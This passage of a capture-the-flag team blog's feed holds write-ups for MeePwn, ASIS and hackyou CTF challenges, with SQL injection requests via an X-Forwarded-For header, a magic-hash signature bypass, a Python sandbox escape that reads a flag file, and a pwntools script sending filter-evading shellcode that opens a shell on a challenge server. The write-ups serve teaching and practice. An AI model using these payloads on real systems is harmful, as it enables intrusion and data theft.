<p>On line 38, same <code>$ip</code>  (after filtered) will be SELECT from same <code>users</code> table. But this time this should return <code>admin if we want flag at line 43.<br />
</code></p>
<p>This is confusing when with 2 same query but have 2 difference results. The first thing popped up like an alert box in my mind is using some kind of condition query. More detail, 1st: query return guest if condition A else admin, then change A; 2nd: because A changed so query return admin.</p>
<p>The INSERT query could be abuse for that. In MySQL there is a thing called <a href="https://dev.mysql.com/doc/refman/5.7/en/user-variables.html">variable</a>.<br />
They are permanently in same and single connection to database.<br />
My ideas come clear with SQL query look like:</p>
<p>select username from users where id = -1 union select ( 'guest' if @a=1337 else 'admin')<br />
insert into logs values(''),(@a:=1337),('')<br />
select username from users where id = -1 union select ( 'guest' if @a=1337 else 'admin')</p>
<p>But I came first with a solution did not require `union` and `select`.<br />
Enum the <code>id</code> parameter (?id=1,?id=2, ?id=3...) , it turned out 1 is <code>admin</code> and 2 is <code>guest</code>, add a little math-MySQL-magic, trial-error, help from MySQL documents, I have got final payload:</p>
<p><code><br />
GET /?id=2-if(@a=1337,@a:=1,@a:=0) HTTP/1.1<br />
Host: 139.59.239.133<br />
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0<br />
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />
Accept-Language: en-US,en;q=0.5<br />
Accept-Encoding: gzip, deflate<br />
Connection: close<br />
X-Forwarded-For: 1'),(@a:=1337),('2<br />
Upgrade-Insecure-Requests: 1<br />
</code></p>
<p>With response<br />
<code>Br0kenMySQL<br />
&lt;p style="color: red;"&gt;Br0kenMySQL&lt;/p&gt;<br />
string(18) "1'),(@a:=1337),('2"<br />
What ???????<br />
Login as guest&amp;amp;admin at the same time ?<br />
Seems our code is broken, here is your bounty<br />
MeePwnCTF{_b4by_tr1ck_fixed}<br />
</code><br />
2.<br />
This is an upgrade version of the first task.<br />
It added more filter <code>select|from|<span class='MathJax_Preview'><img src='https://i0.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_b99834bc19bbad24580b3adfa04fb947.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span></code>, now I need <code>$id</code> without select, from, and (, ), luckily, now I only need remove ( and ),<br />
In MySQL there are a lot of conditional statement. because <code>IF</code> need his parent-heses, in <code>CASE</code> of fire, break glass, <code>THEN</code> call <code>114</code>. Oh, did you who am I talking about?</p>
<p>Yeah, it is <a href="https://dev.mysql.com/doc/refman/5.7/en/case.html">CASE ... THEN ... ELSE ... END</a><br />
Debugging <code>INSERT</code> in mysqlclient connected to my test database let me know that I can assign variable's value inside statement, it is just a subquery if I correct.</p>
<p><code>GET /v2/?id=2-case+when+%40a%3d1337+then+1+else+0+end HTTP/1.1<br />
Host: 139.59.239.133<br />
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0<br />
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />
Accept-Language: en-US,en;q=0.5<br />
Accept-Encoding: gzip, deflate<br />
Connection: close<br />
X-Forwarded-For: '+@a:=1337+'<br />
Upgrade-Insecure-Requests: 1</code></p>
<p><code>Br0kenMySQL<br />
&lt;p style="color: red;"&gt;Br0kenMySQL&lt;/p&gt;<br />
string(12) "'+@a:=1337+'"<br />
What, again ???????!@#$!@#$!@#$<br />
MeePwnCTF{_I_g1ve__uPPPPPPPP}<br />
http://139.59.239.133/c541c6ed5e28b8762c4383a8238e6f5632cc7df6da8ce9db7a1aa706d1e5c387/?debug=%F0%9F%95%B5<br />
</code><br />
3.<br />
Althrough <code>time|date|sec|day</code> was blacklisted but I didn't use any of them.<br />
Yay, same payload for 3rd flag.</p>
<p>Thanks @ml for great challenges. You absolutely should try <a href="https://github.com/l4wio/CTF-challenges-by-me/tree/master/meepwn-2017">his CTF challenge</a> repo at Github.</p>
<p>Ref:</p>
<ul>
<li>https://pastebin.com/T7zAcdhb</li>
<li>https://pastebin.com/kLAyi6qS</li>
<li>https://pastebin.com/v0PAEFNY</li>
<li>https://www.owasp.org/index.php/SQL_Injection</li>
<li>http://php.net/manual/en/types.comparisons.php</li>
<li>http://php.net/manual/en/reserved.variables.server.php</li>
<li>https://en.wikipedia.org/wiki/X-Forwarded-For</li>
<li>https://dev.mysql.com/doc/refman/5.7/en/user-variables.html</li>
<li>https://dev.mysql.com/doc/refman/5.7/en/case.html</li>
<li>https://github.com/l4wio/CTF-challenges-by-me/tree/master/meepwn-2017</li>
</ul>
<p>&nbsp;</p>
]]></content:encoded>
									<post-id xmlns="com-wordpress:feed-additions:1">655</post-id>	</item>
		<item>
		<title>ASISCTF 2017 - Web - Secure portal [1,2,3]</title>
		<link>https://babyphd.net/2017/05/12/asisctf-2017-web-secure-portal-123/</link>
				<pubDate>Fri, 12 May 2017 13:38:37 +0000</pubDate>
		<dc:creator><![CDATA[justcallmedude]]></dc:creator>
				<category><![CDATA[web]]></category>
		<category><![CDATA[unserialize]]></category>

		<guid isPermaLink="false">https://babyphd.net/?p=642</guid>
				<description><![CDATA[Hey yo! Long time no C++ Có chút vấn đề khi mình viết writeup cho bài này đó là phần lầy flag có vẻ không hoạt động 🙁 nên hiện tại mình chỉ có thể viết được phần 1. Okie, link Có gợi ý như sau By the way I know it's dangerous to code with &#8230; <a href="https://babyphd.net/2017/05/12/asisctf-2017-web-secure-portal-123/" class="more-link">Continue reading <span class="screen-reader-text">ASISCTF 2017 - Web - Secure portal [1,2,3]</span> <span class="meta-nav">&#8594;</span></a>]]></description>
								<content:encoded><![CDATA[<p>Hey yo!</p>
<p>Long time no C++<br />
Có chút vấn đề khi mình viết writeup cho bài này đó là phần lầy flag có vẻ không hoạt động <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f641.png" alt="🙁" class="wp-smiley" style="height: 1em; max-height: 1em;" /> nên hiện tại mình chỉ có thể viết được phần 1.</p>
<p>Okie, <a href="http://66.172.33.77:8080/">link</a></p>
<p>Có gợi ý như sau <em><strong>By the way I know it's dangerous to code with IDE in server-side but I really obey security instructions</strong>.</em></p>
<p>Vào trang web và lưu lại các request &amp; response bằng Burpsuite Proxy</p>
<p style="text-align: center;"><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/1.png?ssl=1"><img data-attachment-id="643" data-permalink="https://babyphd.net/2017/05/12/asisctf-2017-web-secure-portal-123/1-2/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/1.png?fit=1221%2C750&amp;ssl=1" data-orig-size="1221,750" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="1" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/1.png?fit=300%2C184&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/1.png?fit=604%2C371&amp;ssl=1" class="aligncenter wp-image-643 size-full" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/1.png?resize=604%2C371&#038;ssl=1" width="604" height="371" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/1.png?w=1221&amp;ssl=1 1221w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/1.png?resize=300%2C184&amp;ssl=1 300w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/1.png?resize=768%2C472&amp;ssl=1 768w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/1.png?resize=1024%2C629&amp;ssl=1 1024w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
<p style="text-align: center;"><span id="more-642"></span></p>
<p style="text-align: left;">Có thể là có cả những file cấu hình project - Information leak. Tiện sẵn máy mình cũng cài PHPStorm nên tạo luôn 1 project để xem thế nào</p>
<p style="text-align: left;"><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/2.png?ssl=1"><img data-attachment-id="644" data-permalink="https://babyphd.net/2017/05/12/asisctf-2017-web-secure-portal-123/2-2/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/2.png?fit=490%2C165&amp;ssl=1" data-orig-size="490,165" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="2" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/2.png?fit=300%2C101&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/2.png?fit=490%2C165&amp;ssl=1" class="size-full wp-image-644 aligncenter" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/2.png?resize=490%2C165&#038;ssl=1" alt="" width="490" height="165" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/2.png?w=490&amp;ssl=1 490w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/2.png?resize=300%2C101&amp;ssl=1 300w" sizes="(max-width: 490px) 100vw, 490px" data-recalc-dims="1" /></a></p>
<p style="text-align: left;">Như vậy là có các file như trong hình, thử vào <code>.idea/workspace.xml</code> và ...</p>
<p style="text-align: left;"><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/3.png?ssl=1"><img data-attachment-id="645" data-permalink="https://babyphd.net/2017/05/12/asisctf-2017-web-secure-portal-123/3-2/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/3.png?fit=1063%2C596&amp;ssl=1" data-orig-size="1063,596" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="3" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/3.png?fit=300%2C168&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/3.png?fit=604%2C339&amp;ssl=1" class="size-full wp-image-645 aligncenter" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/3.png?resize=604%2C339&#038;ssl=1" alt="" width="604" height="339" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/3.png?w=1063&amp;ssl=1 1063w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/3.png?resize=300%2C168&amp;ssl=1 300w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/3.png?resize=768%2C431&amp;ssl=1 768w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/05/3.png?resize=1024%2C574&amp;ssl=1 1024w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
<p style="text-align: left;">Tiếp tục là 1 file php khác</p>
<p style="text-align: left;"><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/4.3.png?ssl=1"><img data-attachment-id="646" data-permalink="https://babyphd.net/2017/05/12/asisctf-2017-web-secure-portal-123/4-3/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/4.3.png?fit=731%2C644&amp;ssl=1" data-orig-size="731,644" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="4.3" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/4.3.png?fit=300%2C264&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/4.3.png?fit=604%2C532&amp;ssl=1" class="size-full wp-image-646 aligncenter" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/4.3.png?resize=604%2C532&#038;ssl=1" alt="" width="604" height="532" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/4.3.png?w=731&amp;ssl=1 731w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/4.3.png?resize=300%2C264&amp;ssl=1 300w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
<p style="text-align: left;">Phân tích kỹ ta có 1 đoạn compare lỗi <code>==</code> ở <code>if($realSign == $signature)</code></p>
<p style="text-align: left;">Bypass bằng cách bruteforce input để md5sum của (input + unknown-key) = 0e[a-f0-9]{30} aka <strong><em><a href="https://www.whitehatsec.com/blog/magic-hashes/">magic hash</a></em></strong>, sau đó đến phần unserialize của $payload... hmm, không đơn giản lắm nhỉ, bruteforce mà vẫn phải unserialize được. Tuy nhiên thì ta có thể chèn thêm junk variables vào trong $payload mà deserialize không ảnh hưởng gì cả.</p>
<p style="text-align: left;">Ví dụ</p>
<p style="text-align: left;"><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/4.1.png?ssl=1"><img data-attachment-id="647" data-permalink="https://babyphd.net/2017/05/12/asisctf-2017-web-secure-portal-123/4-1/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/4.1.png?fit=584%2C252&amp;ssl=1" data-orig-size="584,252" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="4.1" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/4.1.png?fit=300%2C129&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/4.1.png?fit=584%2C252&amp;ssl=1" class="size-full wp-image-647 aligncenter" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/4.1.png?resize=584%2C252&#038;ssl=1" alt="" width="584" height="252" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/4.1.png?w=584&amp;ssl=1 584w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/4.1.png?resize=300%2C129&amp;ssl=1 300w" sizes="(max-width: 584px) 100vw, 584px" data-recalc-dims="1" /></a></p>
<p style="text-align: left;"><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/05/4.2.png?ssl=1"><img data-attachment-id="648" data-permalink="https://babyphd.net/2017/05/12/asisctf-2017-web-secure-portal-123/4-2/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/05/4.2.png?fit=782%2C300&amp;ssl=1" data-orig-size="782,300" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="4.2" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/05/4.2.png?fit=300%2C115&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/05/4.2.png?fit=604%2C232&amp;ssl=1" class="size-full wp-image-648 aligncenter" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/05/4.2.png?resize=604%2C232&#038;ssl=1" alt="" width="604" height="232" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/05/4.2.png?w=782&amp;ssl=1 782w, https://i1.wp.com/babyphd.net/wp-content/uploads/2017/05/4.2.png?resize=300%2C115&amp;ssl=1 300w, https://i1.wp.com/babyphd.net/wp-content/uploads/2017/05/4.2.png?resize=768%2C295&amp;ssl=1 768w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
<p style="text-align: left;">Chạy 1 lúc (ở server cũ)</p>
<p style="text-align: left;"><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/5.png?ssl=1"><img data-attachment-id="649" data-permalink="https://babyphd.net/2017/05/12/asisctf-2017-web-secure-portal-123/attachment/5/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/5.png?fit=956%2C385&amp;ssl=1" data-orig-size="956,385" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="5" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/5.png?fit=300%2C121&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/5.png?fit=604%2C243&amp;ssl=1" class="size-full wp-image-649 aligncenter" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/5.png?resize=604%2C243&#038;ssl=1" alt="" width="604" height="243" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/5.png?w=956&amp;ssl=1 956w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/5.png?resize=300%2C121&amp;ssl=1 300w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/5.png?resize=768%2C309&amp;ssl=1 768w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
<p style="text-align: left;">Sử dụng auth trên để lấy flag + source cho phần thứ 2.</p>
<p style="text-align: left;">&lt;continue&gt;</p>
]]></content:encoded>
									<post-id xmlns="com-wordpress:feed-additions:1">642</post-id>	</item>
		<item>
		<title>hackyou.ctf.su 2016</title>
		<link>https://babyphd.net/2016/11/24/hackyou-ctf-su-2016/</link>
				<comments>https://babyphd.net/2016/11/24/hackyou-ctf-su-2016/#comments</comments>
				<pubDate>Thu, 24 Nov 2016 17:13:17 +0000</pubDate>
		<dc:creator><![CDATA[justcallmedude]]></dc:creator>
				<category><![CDATA[pwn]]></category>
		<category><![CDATA[re]]></category>

		<guid isPermaLink="false">https://babyphd.net/?p=627</guid>
				<description><![CDATA[This is my write-up for recent hack you spb CTF - a CTF for newbies. I guess I'm a bit older here ahaha. Reverse 100: #include &#60;stdio.h&#62; #include &#60;string.h&#62; int main() { char buf[64]; gets(buf); int l = strlen(buf); if (l * l != 144) return 1; unsigned int a = buf[0] &#124; (buf[4] &#60;&#60; 8) &#124; &#8230; <a href="https://babyphd.net/2016/11/24/hackyou-ctf-su-2016/" class="more-link">Continue reading <span class="screen-reader-text">hackyou.ctf.su 2016</span> <span class="meta-nav">&#8594;</span></a>]]></description>
								<content:encoded><![CDATA[<p>This is my write-up for recent <a href="http://hackyou.ctf.su/">hack you spb</a> CTF - a CTF for newbies. I guess I'm a bit older here ahaha.</p>
<p><span id="more-627"></span></p>
<p>Reverse 100:</p>
<pre class="lang:c decode:true ">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int main() {
	char buf[64];
	gets(buf);
	int l = strlen(buf);
	if (l * l != 144)
		return 1;
	unsigned int a = buf[0] | (buf[4] &lt;&lt; 8) | (buf[8] &lt;&lt; 16);
	unsigned int b = buf[1] | (buf[5] &lt;&lt; 8) | (buf[9] &lt;&lt; 16);
	unsigned int c = buf[2] | (buf[6] &lt;&lt; 8) | (buf[10] &lt;&lt; 16);
	unsigned int d = buf[3] | (buf[7] &lt;&lt; 8) | (buf[11] &lt;&lt; 16);
	if (!(((a % 3571) == 2963) &amp;&amp; (((a % 2843) == 215)) &amp;&amp; (((a % 30243) == 13059))))
		return 2;
	if (!(((b % 80735) == 51964) &amp;&amp; (((b % 8681) == 2552)) &amp;&amp; (((b % 40624) == 30931))))
		return 3;
	if (!(((c % 99892) == 92228) &amp;&amp; (((c % 45629) == 1080)) &amp;&amp; (((c % 24497) == 12651))))
		return 4;
	if (!(((d % 54750) == 26981) &amp;&amp; (((d % 99627) == 79040)) &amp;&amp; (((d % 84339) == 77510))))
		return 5;
	printf("Congratulations %s is flag\n",buf);
	return 0;
}</pre>
<p>First of all, I think about use something like z3, or any SAT that could give me the valid number. But z3 took a lot of time, so I decided to look deeper... Yes, you could finger out there is a pattern (x % number1 == number2), so you could apply <b><a href="https://en.wikipedia.org/wiki/Chinese_remainder_theorem">Chinese remainder theorem</a> </b>to get a, b, c.</p>
<p>Reverse 200:<br />
This is a .pyc file, which is a file contain python byte-code. As usual, for byte-code relative problems, I search for some python byte-code decompiler and found <a href="https://github.com/zrax/pycdc">pycdc</a>.<br />
After decompil, you should get something like this</p>
<pre class="lang:python decode:true"># Source Generated with Decompyle++
# File: rev200_bot_7b541a1.pyc (Python 2.7)

import config
import traceback
import re
from base64 import *
from twx.botapi import TelegramBot, ReplyKeyboardMarkup, ReplyKeyboardHide
sec_state = { }

def process_message(bot, u):
Warning: Stack history is not empty!
    if u.message.sender and u.message.text and u.message.chat:
        chat_id = u.message.chat.id
        user = u.message.sender.username
        reply_hide = ReplyKeyboardHide.create()
        print 'user:%s mes:%s' % (user, u.message.text)
        if user not in sec_state:
            sec_state[user] = {
                'mode': 15,
                'stage': 7 }
        cmd1 = u.message.text.encode('utf-8')
        a = re.findall('(\\/\\w+)\\s*(.*)', cmd1)
        if a:
            cmd = a[0][0]
            data = a[0][1]
            if cmd == '/help':
                bot.send_message(chat_id, 'Usage: \n\n/help - show this help\n/enter - enter secret mode\n', reply_markup = reply_hide)
            if cmd == '/enter':
                keyboard = [
                    [
                        '-7-',
                        '-8-',
                        '-9-'],
                    [
                        '-4-',
                        '-5-',
                        '-6-'],
                    [
                        '-1-',
                        '-2-',
                        '-3-'],
                    [
                        '-0-']]
                reply_markup = ReplyKeyboardMarkup.create(keyboard)
                bot.send_message(chat_id, 'please enter access code', reply_markup = reply_markup).wait()
            if sec_state[user]['mode'] == 0 and cmd == '/7779317':
                ddd = b64decode(data)
                bot.send_message(chat_id, eval(ddd))
            
        a = re.findall('-(\\d+)-', cmd1)
        if a:
            num = a[0]
            if int(num) == sec_state[user]['stage']:
                sec_state[user]['stage'] = (sec_state[user]['stage'] * sec_state[user]['stage'] ^ 1337) % 10
                sec_state[user]['mode'] = sec_state[user]['mode'] - 1
                if sec_state[user]['mode'] &lt; 0:
                    sec_state[user]['mode'] = 0
                if sec_state[user]['mode'] == 0:
                    bot.send_message(chat_id, 'Secret mode enabled!', reply_markup = reply_hide).wait()
                
            else:
                print 'NO', num, sec_state[user]['stage']
                bot.send_message(chat_id, 'Invalid password!', reply_markup = reply_hide).wait()
                sec_state[user]['mode'] = 15
        

bot = TelegramBot(config.token)
bot.update_bot_info().wait()
print bot.username
last_update_id = 0
while True:
    updates = bot.get_updates(offset = last_update_id).wait()
    
    try:
        for update in updates:
            if int(update.update_id) &gt; int(last_update_id):
                last_update_id = update.update_id
                process_message(bot, update)
                continue
    continue
    except Exception:
        ex = None
        print traceback.format_exc()
        continue
    
</pre>
<p>So this is a kind of chat-bot server based on Telegram.<br />
There is eval function inside,  bot.send_message(chat_id, eval(ddd)), so I need to control ddd which is a base64 decoded string from data we sent. Before that, I need to enter Secret mode by enter correct access code (0-9).<br />
First, set sec_state[user]['mode'] = 0; First time, stage init to 7, that changed everytime you press the correct key; But if I dont remember the stage, I still could find out by bruteforce from 0 to 9, if I didn't recv incorrect message that's mean I pressed the correct one; then by use the following script, I'm able to access secret area;</p>
<pre class="lang:python decode:true ">#coding: utf-8
sec_state = { }
user = "A"
sec_state[user] = {
'mode': 15,
'stage': 7 } # bruteforce number
sec_state[user]['mode'] = 15
r = []
while 1:
	num = sec_state[user]['stage']
	r.append(num)
	print "-%d-" % num
	sec_state[user]['stage'] = (sec_state[user]['stage'] * sec_state[user]['stage'] ^ 1337) % 10
	sec_state[user]['mode'] = sec_state[user]['mode'] - 1
	if sec_state[user]['mode'] &lt; 0:
	    sec_state[user]['mode'] = 0
	if sec_state[user]['mode'] == 0:
		break

print sec_state[user]['mode']</pre>
<p>Next, this is a <a href="https://blog.inexplicity.de/plaidctf-2013-pyjail-writeup-part-i-breaking-the-sandbox.html">pyjail</a>, so I can't execute normal python command...<br />
So, final payload is `str(().__class__.__base__.__subclasses__()[<strong>40</strong>]("flag","r").read())`or `/7779317 c3RyKCgpLl9fY2xhc3NfXy5fX2Jhc2VfXy5fX3N1YmNsYXNzZXNfXygpWzQwXSgiZmxhZyIsInIiKS5yZWFkKCkp`</p>
<p>Reverse 300:<br />
Let's get some fun.</p>
<p>let reverse this (or not?), look at handler (the main function)</p>
<pre class="lang:c decode:true">ssize_t __cdecl handler(int fd)
{
  ssize_t result; // eax@1
  unsigned int buf; // [sp+20h] [bp-18h]@1
  int v3; // [sp+24h] [bp-14h]@1
  char *v4; // [sp+28h] [bp-10h]@4
  int v5; // [sp+2Ch] [bp-Ch]@4

  buf = 0;
  setuid(0x3E8u);
  seteuid(0x3E8u);
  setgid(0x3E8u);
  setegid(0x3E8u);
  result = recv(fd, &amp;buf, 4u, 0);
  v3 = result;
  if ( result == 4 )
  {
    result = buf;
    if ( buf &lt;= 0xC8 )
    {
      v4 = (char *)mmap(0, buf, 7, 33, -1, 0);
      v3 = recv(fd, v4, buf, 0);
      result = crc32(0, v4, buf);
      v5 = result;
      if ( result == 0xCAFEBABE )
      {
        result = filter(v4, buf) ^ 1;
        if ( !(_BYTE)result )
          result = ((int (*)(void))v4)();
      }
    }
  }
  return result;
}</pre>
<p>So the basic idea is make result == 0xCAFEBABE, so the program will execute v4 as shellcode (function pointer), but you also need to bypass the filter function - check if contain any of 0x0, 0x1, 0x2f, 0x68, 0x73 ( so I can't use sh in plaintext)then exit; So, I did the following step:</p>
<p>1. Find a program that can make crc32 of my shellcode equal 0xCAFEBABE<br />
2. Make a great shellcode and Bypass filter.<br />
By search google for everything, the answer for problem 1 is<a href="https://www.nayuki.io/page/forcing-a-files-crc-to-any-value"> force-crc32</a>.<br />
Currently I'm also trying to learn some binary exploit method, write a shellcode isn't hard (hint <em>xor</em>), but if there is any framework that's good enough as <a href="https://github.com/Gallopsled/pwntools"><code>pwntools</code> </a>, you shoud try at least once.<br />
Basicaly, I import pwns and let pwntools do the rest;</p>
<pre class="lang:python decode:true ">from pwn import *
import socket, struct, telnetlib
def getCRC(data):
	import subprocess
	with open('/tmp/12', 'wb') as f:
		f.write(data + "123456")
	subprocess.check_output(['python', 'forcecrc32.py', '/tmp/12', str(len(data)+1) , 'CAFEBABE'])
	with open('/tmp/12', 'rb') as f:
		data = f.read()
	return data
def crc32(data):# recheck
	import zlib
	return (zlib.crc32(data)) &amp; 0xffffffff


d = ""
d += asm(pwnlib.shellcraft.i386.linux.dup2(4,0))
d += asm(pwnlib.shellcraft.i386.linux.dup2(4,1))
# i need dup2 because the program use itself as server
d += asm(pwnlib.shellcraft.i386.linux.sh())

fsc = pwnlib.encoders.encoder.encode(d, '\n\x01\0\x2f\x73\x68')

print len(fsc)
fsc = getCRC(fsc) # it didn't contain any blocked char, so i dont need to re-generate again.
print hex(crc32(fsc))

#yes, i love my custom socket lib <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f641.png" alt="🙁" class="wp-smiley" style="height: 1em; max-height: 1em;" />
s = socket.create_connection(("78.46.101.237", 3177))

s.send(p32(len(fsc)))
s.send(fsc)
s.send("\n")

s.send("cat flag*\n") 
print s.recv(1024)</pre>
<p>To be continued....</p>
]]></content:encoded>
							<wfw:commentRss>https://babyphd.net/2016/11/24/hackyou-ctf-su-2016/feed/</wfw:commentRss>
		<slash:comments>2</slash:comments>
						<post-id xmlns="com-wordpress:feed-additions:1">627</post-id>	</item>
		<item>
		<title>Whitehat Contest 12 - Pwn400</title>
		<link>https://babyphd.net/2016/09/11/whitehat-contest-11-pwn400/</link>
				<comments>https://babyphd.net/2016/09/11/whitehat-contest-11-pwn400/#comments</comments>
